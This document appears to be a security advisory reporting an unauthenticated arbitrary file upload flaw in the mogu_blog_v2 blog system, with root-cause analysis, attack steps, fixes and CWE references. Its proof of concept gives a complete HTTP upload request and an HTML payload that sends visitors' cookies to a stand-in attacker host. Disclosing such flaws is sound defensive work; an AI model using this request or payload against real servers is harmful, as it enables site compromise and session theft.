# Unauthenticated Arbitrary File Upload in mogu_blog_v2 via /file/pictures

## Vulnerability Overview

**Submitter**: sh7err@vEcho

mogu_blog_v2 is a microservice-based front-end and back-end separated blog system. A critical security vulnerability has been identified in the file upload functionality that allows unauthenticated attackers to upload arbitrary files (including HTML, JavaScript, SQL, JSP, and other dangerous file types) to the server without any authentication or proper validation.

## Affected Component

- **Project**: mogu_blog_v2
- **Vendor**: moxi159753
- **Affected Endpoint**: `/file/pictures`
- **Affected Files**:
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/config/WebSecurityConfig.java` (lines 50-55)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/restapi/FileRestApi.java` (lines 81-86)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/service/impl/FileServiceImpl.java` (lines 130-257)
  - `mogu_utils/src/main/java/com/moxi/mogublog/utils/FileUtils.java` (lines 217-317)

## Vulnerability Details

### Root Cause

The vulnerability exists due to multiple critical security weaknesses:

1. **Missing Authentication**: The `/file/**` endpoint pattern is configured with `permitAll()` in Spring Security configuration, allowing unauthenticated access.

2. **No Authentication Check**: The `uploadPics` controller method does not call `RequestHolder.checkLogin()` or perform any authentication validation.

3. **Client-Controlled Identity**: When `source=picture`, the application retrieves `userUid`, `adminUid`, `projectName`, and `sortName` directly from request parameters (FileServiceImpl.java:148-154) without verification.

4. **Insufficient Validation**: The code only checks that `userUid` or `adminUid` is non-empty (lines 172-175) but does not validate these values against the database or authenticate the user.

5. **Overly Permissive File Type Whitelist**: The `FileUtils.isSafe()` method allows dangerous file types including:
   - HTML files (phishing, XSS)
   - JavaScript files (malicious scripts)
   - SQL files (database schema exposure)
   - Java files (source code)
   - CSS files
   - VUE files
   - And many others (FileUtils.java:217-317)

6. **Predictable File Paths**: The default file sort configuration uses predictable paths (e.g., `blog/admin`, `blog/user`) that are pre-configured in the database.

### Attack Vector

An attacker can exploit this vulnerability by:

1. Sending a multipart/form-data POST request to `/file/pictures` without authentication
2. Setting `source=picture` to bypass attribute-based validation
3. Providing fake `userUid`/`adminUid` values (any non-empty string)
4. Using predictable `projectName` (e.g., `blog`) and `sortName` (e.g., `admin`) values that exist in the database
5. Uploading files with dangerous extensions (HTML, JS, JSP, etc.)

The uploaded files are stored in publicly accessible directories and can be accessed directly via HTTP.

## Proof of Concept

### Upload Malicious HTML File

```http
POST /file/pictures HTTP/1.1
Host: target-server.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="source"

picture
------WebKitFormBoundary
Content-Disposition: form-data; name="userUid"

uid00000000000000000000000000000
------WebKitFormBoundary
Content-Disposition: form-data; name="projectName"

blog
------WebKitFormBoundary
Content-Disposition: form-data; name="sortName"

admin
------WebKitFormBoundary
Content-Disposition: form-data; name="filedatas"; filename="malicious.html"
Content-Type: text/html

<html>
<body>
<script>
  // Malicious JavaScript code
  document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>
</body>
</html>
------WebKitFormBoundary--
```

### Response

```json
{
  "success": true,
  "data": [{
    "uid": "...",
    "picUrl": "blog/admin/html/2024/06/03/1717390000000.html",
    ...
  }]
}
```

### Exploitation

Access `http://target-server.com/blog/admin/html/2024/06/03/1717390000000.html` to trigger the malicious HTML/JavaScript.

## Impact

This vulnerability has **CRITICAL** severity and allows attackers to:

1. **Host Malicious Content**: Upload phishing pages, malware distribution sites, and credential harvesting forms
2. **Cross-Site Scripting (XSS)**: Upload HTML/JavaScript files that execute in victims' browsers when accessed
3. **Defacement**: Replace legitimate site content with attacker-controlled pages
4. **Resource Exhaustion**: Upload large files to consume disk space and cause denial of service
5. **Information Disclosure**: Upload files that reveal internal system information or source code
6. **Social Engineering**: Host convincing fake login pages on the legitimate domain
7. **Malware Distribution**: Use the legitimate domain to distribute malicious files, bypassing security filters

The complete lack of authentication combined with overly permissive file type validation creates a critical security risk.

## Affected Versions

All versions of mogu_blog_v2 in the current repository are affected. The vulnerability exists in both Eureka and Nacos branches.

## Recommendations

1. **Require Authentication**: Remove `/file/**` from `permitAll()` in `WebSecurityConfig.java`
2. **Implement Authentication Checks**: Call `RequestHolder.checkLogin()` in the `uploadPics` method
3. **Validate User Identity**: Retrieve `userUid`/`adminUid` from authenticated session instead of request parameters
4. **Restrict File Types**: Only allow safe file types (images, PDFs) and block dangerous extensions
5. **Content-Type Validation**: Verify file content matches declared type (magic byte validation)
6. **File Size Limits**: Enforce strict file size limitations
7. **Separate Storage Domain**: Serve uploaded files from a separate domain to prevent cookie theft
8. **Content Security Policy**: Implement CSP headers to prevent script execution from uploaded files
9. **Virus Scanning**: Integrate antivirus scanning for uploaded files
10. **Access Control**: Implement proper authorization checks for file sort access

## References

- Repository: https://gitee.com/moxi159753/mogu_blog_v2
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-862: Missing Authorization
- CWE-79: Cross-site Scripting (XSS)
- OWASP: Unrestricted File Upload
